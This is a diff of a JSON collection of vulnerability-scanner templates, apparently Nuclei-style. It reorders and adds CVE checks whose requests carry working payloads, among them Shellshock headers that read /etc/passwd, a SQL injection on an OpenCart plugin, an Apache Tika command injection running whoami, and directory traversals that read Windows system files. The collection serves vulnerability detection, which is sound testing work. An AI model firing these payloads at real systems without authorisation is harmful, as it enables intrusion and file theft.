@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6019,6 +6019,20 @@
       ]
     },
     {
+      "id": "CVE-2018-11231",
+      "info": {
+        "name": "Opencart Divido plugin - Sql Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /upload/index.php?route=extension/payment/divido/update HTTP/1.1\nHost: {{Hostname}}\n\n{\"metadata\":{\"order_id\":\"1 and updatexml(1,concat(0x7e,(SELECT md5(202072102)),0x7e),1)\"},\"status\":2}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-11409",
       "info": {
         "name": "Splunk Sensitive Information Disclosure",
@@ -6270,11 +6284,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -8090,20 +8104,6 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2019-15043",
-      "info": {
-        "name": "Grafana unauthenticated API",
-        "severity": "high"
-      },
-      "requests": [
-        {
-          "raw": [
-            "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nContent-Length: 235\nAccept: */*\nAccept-Language: en\nContent-Type: application/json\n\n{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}\n"
           ]
         }
       ]
@@ -10911,9 +10911,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -14087,7 +14087,7 @@
       "requests": [
         {
           "raw": [
-            "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}\n"
+            "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}\n"
           ]
         }
       ]
@@ -17455,6 +17455,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/web/service/search/auto-completion/domain/en.xml?q=adm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-26233",
+      "info": {
+        "name": "Barco Control Room Management Suite - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
           ]
         }
       ]
